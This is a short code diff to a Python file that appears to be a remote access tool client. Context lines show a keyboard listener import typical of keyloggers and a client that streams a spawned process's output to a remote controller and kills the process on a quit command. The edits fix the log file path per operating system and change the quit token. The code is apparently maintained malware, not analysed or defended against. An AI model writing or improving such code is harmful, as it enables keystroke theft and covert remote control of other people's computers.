@@ -23,8 +23,9 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
 if platform.system() == 'Windows':
     import ctypes
-
-LOG = os.path.join(sys.path[0] + 'log.log')
+    LOG = os.path.join(sys.path[0] + '\\log.log')
+else:
+    LOG = os.path.join(sys.path[0] + '/log.log')
 
 try:
     from pynput.keyboard import Listener
@@ -520,7 +521,7 @@ class Client(object):
                         if line == b'':
                             break
                         self.send(line.replace(b'\n', b''))
-                        if self.receive() == '--q':
+                        if self.receive() == b'QUIT':
                             kill(process.pid)
                             break
                     self.send(process.stderr.read())
